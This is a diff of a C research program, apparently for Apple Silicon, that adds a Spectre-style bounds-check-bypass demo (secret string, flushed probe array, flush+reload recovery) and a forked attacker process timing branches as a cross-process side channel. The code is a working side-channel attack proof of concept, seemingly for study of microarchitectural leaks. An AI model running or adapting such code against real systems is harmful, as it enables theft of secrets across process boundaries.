@@ -15,58 +15,81 @@
 #define MAX_LINES 5000000
 #define MAX_LINE_LENGTH 100
 
-void f2(int input){
-	if (input){
-		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
+const char *secret = "SECRET";
+int size = 10;
+uint8_t temp = 0;
+char __attribute__((aligned(4096))) array[256 * 4096];
+
+// Note: must serialize with isb and dsb ish
+inline __attribute__((always_inline)) void clflush(void *ptr)
+{
+    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
+}
+
+inline __attribute__((always_inline))
+uint64_t rdtsc()
+{
+    uint64_t ts;
+    asm volatile("dsb ish");
+    asm volatile("isb");
+    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
+    asm volatile("isb");
+    return ts;
+}
+
+void victim(int input){
+    if (input < size) {
+		temp = array[input * 4096 + 32];
 	}
+	// if (input){
+	// 	__asm__ __volatile__(
+    //     ".rept 8000\n\t"
+    //     "nop\n\t"
+    //     ".endr\n\t"
+    //     :::);
+	// }
     else {
-		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
+		__asm__ __volatile__(
+        ".rept 8000\n\t"
+        "nop\n\t"
+        ".endr\n\t"
+        :::);
     }
 }
 
 void f1(int input1, int input2, int flag){
+    (void)(flag && (victim(input2), 0));
 	if (input1){
 		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
-        (void)(flag && (usleep(100), 0));
-        (void)(flag && (f2(input2), 0));
 	}
     else {
 		__asm__ __volatile__(".rept 8000\n\t nop\n\t .endr\n\t":::);
     }
 }
 
-int check_conjuring(){
-    uint64_t t1, t2, latency;
-    int testsize = 10;
-    uint64_t *hit = (uint64_t *)malloc(sizeof(uint64_t) * testsize);
-    uint64_t *miss = (uint64_t *)malloc(sizeof(uint64_t) * testsize);
+void dummy(){
+    __asm__ __volatile__(
+    ".rept 7191\n\t"
+    "nop\n\t"
+    ".endr\n\t"
+    :::);
+}
 
-    for (int i = 0; i < testsize; i++) {
-        f1(0, 0, 0);
-        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
-        asm volatile("dsb sy" ::: "memory");
-        f1(0, 0, 0); // not-taken
-        asm volatile("dsb sy" ::: "memory");
-        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
-        hit[i] = t2 - t1;
-        printf("[HIT]  Time (ns): %llu\n", hit[i]);
+void attacker(int input){
+	if (input){
+		__asm__ __volatile__(
+        ".rept 8000\n\t"
+        "nop\n\t"
+        ".endr\n\t"
+        :::);
+	}
+    else {
+		__asm__ __volatile__(
+        ".rept 8000\n\t"
+        "nop\n\t"
+        ".endr\n\t"
+        :::);
     }
-    for (int i = 0; i < testsize; i++) {
-        f1(1, 0, 0);
-        asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
-        asm volatile("dsb sy" ::: "memory");
-        f1(0, 0, 0); // not-taken
-        asm volatile("dsb sy" ::: "memory");
-        asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
-        miss[i] = t2 - t1;
-        printf("[MISS] Time (ns): %llu\n", miss[i]);
-    }
-
-    print_histogram(hit, testsize, "HIT");
-    print_histogram(miss, testsize, "MISS");
-    free(hit);
-    free(miss);
-    return 0;
 }
 
 int main() {
@@ -77,7 +100,6 @@ int main() {
         printf("Error setting CPU core affinity. Please run as root\n");
         return EXIT_FAILURE;
     }
-    check_conjuring();
     
     pid_t pid = fork();
 
@@ -87,7 +109,7 @@ int main() {
     } 
     else if (pid == 0) {
         // Child = Victim
-        sleep(1);
+        // CORE_ID = 0;
         volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
         if (ret == -1)
         {
@@ -101,24 +123,45 @@ int main() {
             return 1;
         }
 
-        int testsec = 2000; // not second. 1/clock speed
+        int testsec = 5;
         srand(time(NULL));
         uint64_t now, start;
         int n = 0;
         
-        FILE *fp = fopen("p1_nested.txt", "w");
-        printf("[Victim] address of func1: %p\n", f1);
+        FILE *fp = fopen("p1.txt", "w");
+        printf("[Victim] address of victim: %p\n", victim);
 
         asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
         while(1) {
             usleep(10);
+            
+            /*********** Spectre ************/
+            // Flush the Probe array
+            memset(array, 0, sizeof(array));
+            for (size_t i = 0; i < 256; i++) {
+                flush(array + i * 4096);
+            }
+            
+            // Reading out-of-bound value
+            flush(&size);
+            victim(secret[n++ % 6]);
+
+            // Recover the secret
+            for(size_t i=0;  i<=255; i++){
+                if(flush_reload((char *)array+4096 *i)){
+                    // printf("The secret is :%ld\n", i);
+                    printf("%ld\n", i);
+                }
+            }
+            /*********** Spectre ************/
+
             int input = rand() % 2;
 
+            victim(0); // victim branch
+            asm volatile("dsb sy" ::: "memory");
             asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
-            asm volatile("dsb sy" ::: "memory");
-            f1(1, input, 1);
-            asm volatile("dsb sy" ::: "memory");
-            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu, %d\n", now, input);
+            // fprintf(fp, "%llu\n", now);
+            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu\n", now);
             if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                 break;
             }
@@ -133,6 +176,15 @@ int main() {
     } 
     else {
         // Parent = Attacker
+        
+        /*********** Spectre ************/
+        // Mistraining
+        // for(size_t i=0; i<n_train; i++){
+        //         flush(&size);
+        //         victim(i);
+        // }
+        /*********** Spectre ************/
+        
         char (*lines)[MAX_LINE_LENGTH] = malloc(sizeof(char[MAX_LINES][MAX_LINE_LENGTH]));
         if (!lines) {
             perror("malloc failed");
@@ -141,32 +193,25 @@ int main() {
 
         uint64_t t1, t2, now, start;
         uint64_t latency;
-        int testsec = 5000; // not second. 1/clock speed
+        int testsec = 15; // not second. cycle-based
         int n = 0;
 
-        FILE *fp = fopen("p2_nested_onlyb1.txt", "w");
-        printf("[Spy] address of f1: %p\n", f1);
+        FILE *fp = fopen("p2.txt", "w");
+        printf("[Attacker] address of attacker: %p\n", attacker);
 
         asm volatile("mrs %[start], S3_2_c15_c0_0" : [start]"=r"(start));
         uint64_t previous = start;
         while(1) {		
             asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
             asm volatile("dsb sy" ::: "memory");
-            f1(0, 0, 0); // b1 not-taken
+            attacker(1); // attacker branch
             asm volatile("dsb sy" ::: "memory");
             asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
             latency = t2 - t1;
-            snprintf(lines[n++], MAX_LINE_LENGTH, "[b1] %lld,%lld\n", t2, latency);
-            
-            // asm volatile("mrs %[t1], S3_2_c15_c0_0" : [t1]"=r"(t1));
-            // asm volatile("dsb sy" ::: "memory");
-            // f2(0); // b2 not-taken
-            // asm volatile("dsb sy" ::: "memory");
-            // asm volatile("mrs %[t2], S3_2_c15_c0_0" : [t2]"=r"(t2));
-            // latency = t2 - t1;
-            // snprintf(lines[n++], MAX_LINE_LENGTH, "[b2] %lld,%lld\n", t2, latency);
 
             asm volatile("mrs %[now], S3_2_c15_c0_0" : [now]"=r"(now));
+            // fprintf(fp, "%llu, %llu, %llu, %llu\n", t1, t2, t2 - t1, now - previous);
+            snprintf(lines[n++], MAX_LINE_LENGTH, "%llu, %llu, %llu, %llu\n", t1, t2, t2 - t1, now - previous);
             previous = now;
             if ((now - start) >= (uint64_t)testsec * 1000000000ULL) {
                 break;
